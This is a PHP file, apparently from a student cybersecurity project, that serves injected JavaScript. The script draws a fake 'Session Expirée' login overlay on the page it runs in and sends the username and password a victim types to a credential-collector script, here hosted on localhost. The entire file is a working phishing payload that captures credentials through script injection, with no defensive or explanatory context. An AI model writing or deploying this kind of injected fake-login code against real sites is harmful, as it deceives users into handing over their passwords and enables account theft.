<?php
// fake_login/receiver.php
header('Content-Type: application/javascript; charset=utf-8');

$sender_id = isset($_GET['sender']) ? intval($_GET['sender']) : 1;
// Chemin absolu vers le collecteur
$url_traitement = "http://localhost/projects/MDI/cyber-securite/messagerie/codes/fake_login/capturer.php?sender=" . $sender_id;
?>

(function() {
    if (document.getElementById('phishing-overlay')) return;

    const overlay = document.createElement('div');
    overlay.id = 'phishing-overlay';
    
    Object.assign(overlay.style, {
        position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh',
        backgroundColor: 'rgba(0, 0, 0, 0.75)', zIndex: '999999',
        display: 'flex', justifyContent: 'center', alignItems: 'center'
    });

    overlay.innerHTML = `
        <div style="background: white; padding: 30px; border-radius: 10px; width: 350px; text-align: center;">
            <h2 style="color: #27ae60;">Session Expirée</h2>
            <p>Veuillez vous reconnecter pour continuer.</p>
            <form action="<?php echo $url_traitement; ?>" method="POST">
                <input type="text" name="fake_user" placeholder="Utilisateur" required style="width: 100%; padding: 8px; margin-bottom: 10px;">
                <input type="password" name="fake_pass" placeholder="Mot de passe" required style="width: 100%; padding: 8px; margin-bottom: 10px;">
                <button type="submit" style="width: 100%; padding: 10px; background: #27ae60; color: white; border: none; cursor: pointer;">Confirmer</button>
            </form>
        </div>
    `;
    document.body.appendChild(overlay);
})();